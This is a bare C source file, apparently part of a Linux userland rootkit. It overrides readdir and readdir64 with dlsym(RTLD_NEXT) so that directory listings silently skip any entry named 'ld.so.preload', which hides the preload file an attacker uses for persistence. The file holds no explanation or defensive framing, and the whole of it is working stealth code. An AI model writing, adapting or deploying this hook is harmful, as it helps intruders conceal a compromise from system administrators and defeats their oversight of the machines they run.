#include <string.h>
#include <stdlib.h>
#include <dirent.h>
#include <dlfcn.h>
#include <fcntl.h>

#define FILENAME "ld.so.preload"

struct dirent *readdir(DIR *dirp)
{
     struct dirent *(*old_readdir)(DIR *dir);     
     old_readdir = dlsym(RTLD_NEXT, "readdir");
     struct dirent *dir;
     while (dir = old_readdir(dirp))
     {
           if(strstr(dir->d_name,FILENAME) == 0) break;     
     }
     return dir;
}

struct dirent64 *readdir64(DIR *dirp)
{
     struct dirent64 *(*old_readdir64)(DIR *dir);     
     old_readdir64 = dlsym(RTLD_NEXT, "readdir64");
     struct dirent64 *dir;
     while (dir = old_readdir64(dirp))
     {
           if(strstr(dir->d_name,FILENAME) == 0) break;
     }
     return dir;
}
